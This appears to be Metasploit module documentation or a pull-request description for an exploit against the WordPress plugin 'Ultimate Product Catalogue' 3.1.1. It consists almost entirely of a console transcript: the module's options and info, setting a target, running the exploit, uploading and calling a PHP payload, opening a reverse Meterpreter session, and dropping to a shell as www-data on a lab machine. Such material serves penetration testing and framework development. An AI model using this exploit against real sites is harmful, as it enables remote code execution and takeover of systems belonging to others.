#### Add WordPress Ultimate Product Catalogue File Upload Vulnerability.

  Application: WordPress Plugin 'Ultimate Product Catalogue' 3.1.1
  Homepage: https://wordpress.org/plugins/ultimate-product-catalogue
  Source Code: https://downloads.wordpress.org/plugin/ultimate-product-catalogue.3.1.1.zip
  Active Installs: 4,000+
  References: https://wpvulndb.com/vulnerabilities/7939

#### Vulnerable packages*
        
  3.1.1
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msf > use exploit/unix/webapp/wp_ultimate_product_catalogue_file_upload 
msf exploit(wp_ultimate_product_catalogue_file_upload) > show options 

Module options (exploit/unix/webapp/wp_ultimate_product_catalogue_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   WP Ultimate Product Caatalogue 3.1.1


msf exploit(wp_ultimate_product_catalogue_file_upload) > info

       Name: WordPress Ultimate Product Catalogue Upload Vulnerability
     Module: exploit/unix/webapp/wp_ultimate_product_catalogue_file_upload
   Platform: PHP
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-04-22

Provided by:
  Luca Ercoli
  Roberto Soares Espreto <robertoespreto@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   WP Ultimate Product Caatalogue 3.1.1

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                       yes       The target address
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits an arbitrary PHP code upload in the WordPress 
  Ultimate Product Catalogue version 3.1.1. The vulnerability allows 
  for arbitrary file upload and remote code execution.

References:
  http://www.osvdb.org/121164
  https://wpvulndb.com/vulnerabilities/7939
  http://blog.seeweb.it/wordpress-ultimate-product-catalogue-vulnerability/

msf exploit(wp_ultimate_product_catalogue_file_upload) > set RHOST 10.10.10.20
RHOST => 10.10.10.20
msf exploit(wp_ultimate_product_catalogue_file_upload) > check
[*] 10.10.10.20:80 - The target service is running, but could not be validated.  # off-line
msf exploit(wp_ultimate_product_catalogue_file_upload) > exploit 

[*] Started reverse handler on 10.10.10.10:4444 
[+] 10.10.10.20:80 - Our payload is at: sAFMmSeoG.php.
[*] 10.10.10.20:80 - Calling payload...
[*] Sending stage (40499 bytes) to 10.10.10.20
[*] Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.20:52049) at 2015-04-27 15:34:42 -0300
[+] Deleted sAFMmSeoG.php

meterpreter > sysinfo 
Computer    : msfdevel
OS          : Linux msfdevel 3.13.0-49-generic #81~precise1-Ubuntu SMP Wed Mar 25 16:32:40 UTC 2015 i686
Meterpreter : php/php
meterpreter > shell
Process 5899 created.
Channel 0 created.

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
